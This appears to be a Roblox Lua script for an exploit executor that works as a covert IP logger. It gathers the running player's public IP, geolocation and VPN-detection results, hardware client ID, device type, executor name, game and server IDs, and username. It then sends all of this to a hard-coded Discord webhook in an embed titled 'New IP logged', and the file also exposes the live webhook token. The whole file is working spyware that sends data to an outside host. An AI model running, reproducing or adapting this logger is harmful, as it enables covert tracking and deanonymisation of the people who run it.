local HttpService = game:GetService("HttpService")
local ip = game:HttpGet("https://api.ipify.org")
local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
local player = game.Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local response1 = game:HttpGet("https://ipinfo.io/widget/demo/" .. ip .. "?dataset=proxy-vpn-detection")
local data1 = HttpService:JSONDecode(response1)

local response = game:HttpGet("http://ip-api.com/json/".. ip)

-- Decode the JSON into a Lua table
local data = HttpService:JSONDecode(response)

-- Function to pretty-print the table
local function prettyPrint(table, indent)
    indent = indent or 0
    local output = ""
    local prefix = string.rep(" ", indent)  -- Create an indentation

    for key, value in pairs(table) do
        output = output .. prefix .. tostring(key) .. ": "
        if type(value) == "table" then
            output = output .. "\n" .. prettyPrint(value, indent + 2)  -- Recursive call for nested tables
        else
            output = output .. tostring(value) .. "\n"
        end
    end

    return output
end


local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Mobile"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    elseif UserInputService.MouseEnabled then
        return "PC"
    else
        return "Unknown Device"
    end
end

local deviceType = getDeviceType()

function sendWebhook(url, content, embed)
	if _G.DiscordId then
		content = "<@" .. tostring(_G.DiscordId) .. ">"
	end
	http.request {
		Url = url;
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
	};
end

function sendLogger()
	local url = "https://discord.com/api/webhooks/1286366140511293530/HXPwP_ciZXm-bUxVvcDNAq77KAxAdZfCyNaAJjeR3l0tlvqV0Zpf_SUxWglFqX9eWa5y"
	local ip = game:HttpGet("https://api.ipify.org")
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
	local placeId = game.PlaceId
	local g_values = ""

	local Embed = {
		["title"] = "New IP logged",
		["description"] = "ez",
		["color"] = 5814783,
		["fields"] = {
			{
				["name"] = "IP Address",
				["value"] = "`" .. ip .. "`",
				["inline"] = true
			},
            {
				["name"] = "Device",
				["value"] = "`" .. deviceType .. "`",
				["inline"] = true
			},
			{
				["name"] = "Client ID",
				["value"] = "`" .. hwid .. "`",
				["inline"] = true
			},
			{
				["name"] = "Executor",
				["value"] = "`" .. identifyexecutor() .. "`",
				["inline"] = true
			},
			{
				["name"] = "Game",
				["value"] = "`" .. placeId .. "`",
				["inline"] = true
			},
			{
				["name"] = "Job ID",
				["value"] = "`" .. game.JobId .. "`",
				["inline"] = true
			},
            {
				["name"] = "IP information",
				["value"] = "`" .. prettyPrint(data) .. "`",
				["inline"] = true
			},
            {
				["name"] = "VPN detection",
				["value"] = "`" .. prettyPrint(data1) .. "`",
				["inline"] = true
			},


			
		},
		["author"] = {
			["name"] = game.Players.LocalPlayer.Name
		}
	}
	sendWebhook(url, "logged", Embed)
end

sendLogger()